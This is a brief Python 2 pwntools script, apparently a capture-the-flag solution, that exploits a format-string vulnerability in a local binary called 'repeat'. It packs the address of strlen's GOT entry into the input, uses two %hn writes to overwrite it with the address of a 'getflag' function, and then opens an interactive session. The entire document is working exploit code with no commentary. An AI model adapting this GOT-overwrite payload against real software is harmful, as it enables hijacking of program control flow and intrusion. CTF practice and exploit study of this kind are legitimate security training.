#!/usr/bin/env python2
from pwn import *
import struct
r_program = process('./repeat')
program = ELF('repeat')
libc = ELF('libc.so.6')
program_strlen = program.got['strlen']
program_getflag = program.symbols['getflag']
libc_strlen = libc.symbols['strlen']
shellcode = ''
shellcode += struct.pack('<i', program_strlen)
shellcode += struct.pack('<i', program_strlen + 2)
a = program_getflag % 0x10000
print(hex(program_getflag))
shellcode += '%' + str(a - 8) +'c%4$hn'
b = 0xffff - a + program_getflag // 0x10000 + 1
shellcode += '%' + str(b) +'c%5$hn'
r_program.recvrepeat(timeout=1)
r_program.sendline(shellcode)
print(repr(r_program.recvrepeat(timeout=1)))
r_program.interactive()
